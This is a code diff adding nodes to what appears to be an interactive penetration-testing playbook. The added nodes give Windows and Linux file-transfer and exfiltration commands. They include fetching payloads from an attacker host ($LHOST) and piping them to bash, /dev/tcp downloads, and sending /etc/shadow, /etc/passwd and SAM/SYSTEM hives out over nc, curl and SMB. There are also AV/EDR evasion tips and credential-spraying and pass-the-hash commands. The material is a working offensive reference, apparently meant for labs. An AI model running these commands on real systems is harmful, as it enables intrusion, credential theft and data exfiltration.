+# ── BITSADMIN (background, survives logoff) ───────────
+bitsadmin /transfer job http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+
+# ── CURL (Windows 10+) ───────────────────────────────
+curl http://$LHOST/shell.exe -o C:\\Windows\\Temp\\shell.exe
+
+# ── BASE64 PASTE (no outbound network) ───────────────
+# Attacker: base64 -w0 tool.exe
+# Target:
+[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Path C:\\Windows\\Temp\\tool.exe -Encoding Byte
+
+# ── UNBLOCK DOWNLOADED FILES ─────────────────────────
+# Windows marks downloaded files as blocked — always unblock
+Unblock-File C:\\Windows\\Temp\\tool.exe
+# Or remove zone identifier:
+Remove-Item -Path C:\\Windows\\Temp\\tool.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue`,
+    warn: "certutil is heavily signatured by AV/EDR. If Defender is active use iwr or SMB. Always run Unblock-File after downloading — blocked files run silently and do nothing.",
+    choices: [
+      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
+      { label: "Linux transfer instead", next: "transfer_linux" },
+      { label: "Tools on box — start Windows privesc", next: "windows_post_exploit" },
+    ],
+  },
+
+  transfer_linux: {
+    phase: "SHELL",
+    title: "File Transfer — Linux (Download Tools)",
+    body: "Get tools onto a Linux target. wget is usually available. curl as fallback. nc/base64 when nothing else works.",
+    cmd: `# ── WGET ─────────────────────────────────────────────
+wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
+wget -q http://$LHOST/linpeas.sh -O /tmp/lp.sh     # quiet
+wget -c http://$LHOST/bigfile -O /tmp/file           # resume
+wget --no-check-certificate https://$LHOST/file -O /tmp/file  # ignore SSL
+chmod +x /tmp/lp.sh && /tmp/lp.sh
+
+# ── CURL ─────────────────────────────────────────────
+curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
+curl -k https://$LHOST/linpeas.sh -o /tmp/lp.sh     # ignore SSL
+chmod +x /tmp/lp.sh
+
+# Fileless — run in memory (never touches disk)
+curl http://$LHOST/linpeas.sh | bash
+curl http://$LHOST/linpeas.sh | sh
+
+# ── SCP ───────────────────────────────────────────────
+# Push from Kali to target (if SSH available)
+scp linpeas.sh user@$ip:/tmp/lp.sh
+scp -r tools/ user@$ip:/tmp/tools/
+
+# Pull from target to Kali
+scp user@$ip:/tmp/loot.txt ~/loot.txt
+
+# ── PYTHON ───────────────────────────────────────────
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/lp.sh', '/tmp/lp.sh')"
+python2 -c "import urllib; urllib.urlretrieve('http://$LHOST/lp.sh', '/tmp/lp.sh')"
+
+# ── BASH /DEV/TCP (no tools available) ───────────────
+bash -c "exec 3<>/dev/tcp/$LHOST/80; echo -e 'GET /lp.sh HTTP/1.0\r\n\r\n' >&3; cat <&3" > /tmp/lp.sh
+
+# ── NC ────────────────────────────────────────────────
+# Attacker: nc -nlvp 4444 < linpeas.sh
+nc $LHOST 4444 > /tmp/lp.sh
+chmod +x /tmp/lp.sh
+
+# ── WRITABLE DIRS ────────────────────────────────────
+# Always try these if /tmp is noexec
+/tmp/          # default
+/dev/shm/      # RAM-based, fast, often overlooked
+/var/tmp/      # persists across reboots
+/run/          # tmpfs on modern Linux
+cd /dev/shm && wget http://$LHOST/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh`,
+    warn: "If /tmp is mounted noexec, use /dev/shm or /var/tmp. Always chmod +x after download. If the file runs but does nothing, check if it downloaded completely — partial downloads are silent failures.",
+    choices: [
+      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
+      { label: "Tools on box — start Linux privesc", next: "linux_post_exploit" },
+      { label: "Windows transfer instead", next: "transfer_windows" },
+    ],
+  },
+
+  transfer_exfil: {
+    phase: "SHELL",
+    title: "File Transfer — Exfiltration (Data Out)",
+    body: "Get data off the target and back to Kali. SMB mapped drive is the cleanest for Windows. curl POST or nc for Linux.",
+    cmd: `# ── WINDOWS EXFIL ────────────────────────────────────
+# SMB mapped drive — best method (lab workflow)
+# Attacker (Kali):
+impacket-smbserver -smb2support kali . -username user -password pass
+
+# Target (Windows):
+net use m: \\\\$LHOST\\kali /user:user pass
+copy PrivescCheck_*.* m:\\
+copy winpeas.txt m:\\
+copy sam m:\\
+copy SYSTEM m:\\
+net use m: /delete
+
+# PowerShell upload to Kali HTTP listener
+# Attacker: python3 -c "import http.server; ..." (or use uploadserver)
+pip3 install uploadserver
+python3 -m uploadserver 80
+# Target:
+Invoke-RestMethod -Uri "http://$LHOST/upload" -Method Post -InFile C:\\Windows\\Temp\\loot.txt
+
+# nc exfil
+# Attacker: nc -nlvp 4444 > loot.txt
+# Target:
+type C:\\Windows\\Temp\\loot.txt | nc $LHOST 4444
+
+# ── LINUX EXFIL ───────────────────────────────────────
+# curl POST file to Kali
+# Attacker: python3 -m uploadserver 80
+curl -X POST http://$LHOST/upload -F "file=@/tmp/loot.txt"
+curl --upload-file /etc/passwd http://$LHOST/passwd
+
+# nc pipe out
+# Attacker: nc -nlvp 4444 > loot.txt
+nc $LHOST 4444 < /tmp/loot.txt
+cat /etc/shadow | nc $LHOST 4444
+
+# SCP pull from Kali (if SSH available on target)
+scp user@$ip:/etc/shadow ~/shadow
+scp user@$ip:/tmp/linpeas_output.txt ~/loot/
+
+# tar + nc (entire directory)
+# Attacker: nc -nlvp 4444 | tar xvf -
+tar czf - /tmp/loot/ | nc $LHOST 4444
+
+# ── BOTH OS — BASE64 ENCODE AND PASTE ────────────────
+# Small files — encode on target, paste into terminal
+base64 /etc/shadow          # Linux
+certutil -encode loot.txt loot.b64 && type loot.b64   # Windows
+
+# ── UPLOADSERVER (easiest Kali listener) ──────────────
+# Install once:
+pip3 install uploadserver
+# Run:
+python3 -m uploadserver 80
+# Then from target:
+curl -X POST http://$LHOST/upload -F "file=@/path/to/file"
+# Files land in current dir on Kali`,
+    warn: null,
+    choices: [
+      { label: "Back to Windows privesc", next: "windows_post_exploit" },
+      { label: "Back to Linux privesc", next: "linux_post_exploit" },
+      { label: "Got hashes — crack them", next: "hashcrack" },
+      { label: "Got hashes — PTH", next: "pth" },
+    ],
+  },
+
 
   // ==========================================
   //  CREDENTIAL REUSE
@@ -6951,20 +7252,20 @@ export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'
 
 # -- NXC (NETEXEC) — SPRAY ALL SERVICES --
 # nxc = netexec, maintained successor to crackmapexec (same syntax)
-nxc smb   $ip -u $USER -p $PASS
-nxc smb   $ip -u $USER -H $HASH   # Pass-the-Hash
-nxc winrm $ip -u $USER -p $PASS
-nxc ssh   $ip -u $USER -p $PASS
-nxc rdp   $ip -u $USER -p $PASS
-nxc ftp   $ip -u $USER -p $PASS
-nxc mssql $ip -u $USER -p $PASS
+nxc smb   $ip -u USER -p PASS
+nxc smb   $ip -u USER -H HASH   # Pass-the-Hash
+nxc winrm $ip -u USER -p PASS
+nxc ssh   $ip -u USER -p PASS
+nxc rdp   $ip -u USER -p PASS
+nxc ftp   $ip -u USER -p PASS
+nxc mssql $ip -u USER -p PASS
 
 # Spray across subnet
-nxc smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
-nxc smb $SUBNET/24 -u $USER -H $HASH --continue-on-success
+nxc smb $SUBNET/24 -u USER -p PASS --continue-on-success
+nxc smb $SUBNET/24 -u USER -H HASH --continue-on-success
 
 # crackmapexec fallback (identical syntax)
-crackmapexec smb $ip -u $USER -p $PASS
+crackmapexec smb $ip -u USER -p PASS
 
 # -- READ OUTPUT ---------------------------
 # [+] = valid creds
@@ -6972,18 +7273,18 @@ crackmapexec smb $ip -u $USER -p $PASS
 
 # -- CONNECT WITH VALID CREDS -------------
 # WinRM (most common)
-evil-winrm -i $ip -u $USER -p $PASS
-evil-winrm -i $ip -u $USER -H $HASH
+evil-winrm -i $ip -u USER -p PASS
+evil-winrm -i $ip -u USER -H HASH
 
 # SSH
-ssh $USER@$ip
+ssh USER@$ip
 
 # SMB shell (psexec — needs admin share)
-impacket-psexec $USER:$PASS@$ip
-impacket-psexec -hashes $HASH $USER@$ip
+impacket-psexec USER:PASS@$ip
+impacket-psexec -hashes HASH USER@$ip
 
 # RDP
-xfreerdp /u:$USER /p:$PASS /v:$ip /cert-ignore
+xfreerdp /u:USER /p:PASS /v:$ip /cert-ignore
 
 # -- USERNAME VARIATIONS -------------------
 # If exact user fails, try variations:
